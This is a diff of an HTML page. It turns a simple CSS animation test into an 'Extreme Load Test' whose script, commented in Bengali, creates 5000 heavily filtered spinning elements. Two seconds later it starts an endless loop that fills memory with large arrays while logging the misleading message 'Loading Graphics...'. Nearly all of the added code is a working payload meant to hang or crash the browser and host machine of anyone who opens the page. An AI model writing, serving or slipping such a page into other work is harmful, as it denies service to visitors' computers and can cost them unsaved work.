@@ -1,66 +1,46 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Heavy HTML Test</title>
-
-<style>
-body {
-    margin: 0;
-    background: black;
-    color: white;
-    font-family: Arial;
-}
-
-/* Heavy animation */
-.box {
-    width: 100px;
-    height: 100px;
-    background: red;
-    margin: 5px;
-    animation: spin 0.2s infinite linear;
-    float: left;
-}
-
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-</style>
+    <title>Extreme Load Test</title>
+    <style>
+        /* গ্রাফিক্সের ওপর প্রচণ্ড চাপ দেওয়ার জন্য CSS */
+        .glitch {
+            width: 50px; height: 50px;
+            background: red;
+            filter: blur(10px) contrast(500%);
+            box-shadow: 0 0 50px blue;
+            animation: rotate 0.1s infinite;
+            display: inline-block;
+        }
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+    </style>
 </head>
-
 <body>
+    <h1>System Stress Testing...</h1>
+    <div id="box"></div>
 
-<h1>Heavy HTML Rendering Test</h1>
+    <script>
+        const box = document.getElementById('box');
+        
+        // ১. ৫০০০টি অ্যানিমেটেড এলিমেন্ট জেনারেট করা (GPU Stress)
+        for (let i = 0; i < 5000; i++) {
+            const div = document.createElement('div');
+            div.className = 'glitch';
+            box.appendChild(div);
+        }
 
-<!-- Massive DOM elements -->
-<div>
-<!-- COPY-PASTE BLOCK START -->
-<div class="box"></div>
-<div class="box"></div>
-<div class="box"></div>
-<div class="box"></div>
-<div class="box"></div>
-<div class="box"></div>
-<div class="box"></div>
-<div class="box"></div>
-<div class="box"></div>
-<div class="box"></div>
-<!-- COPY-PASTE BLOCK END -->
-</div>
+        // ২. মেমোরি এবং প্রসেসর জ্যাম করার ইনফিনিট লুপ (CPU Stress)
+        function freeze() {
+            let storage = [];
+            while (true) {
+                // র‍্যাম ভর্তি করার জন্য ডেটা পুশ করা
+                storage.push(new Array(1000000).fill("HANG_TEST"));
+                console.log("Loading Graphics...");
+            }
+        }
 
-<!-- Repeat this block many times -->
-<div>
-<div class="box"></div><div class="box"></div><div class="box"></div><div class="box"></div>
-<div class="box"></div><div class="box"></div><div class="box"></div><div class="box"></div>
-</div>
-
-<div>
-<div class="box"></div><div class="box"></div><div class="box"></div><div class="box"></div>
-<div class="box"></div><div class="box"></div><div class="box"></div><div class="box"></div>
-</div>
-
-<!-- Keep copying boxes to increase load -->
-
+        // কিছু সময় পর প্রসেসটি শুরু হবে
+        setTimeout(freeze, 2000);
+    </script>
 </body>
 </html>
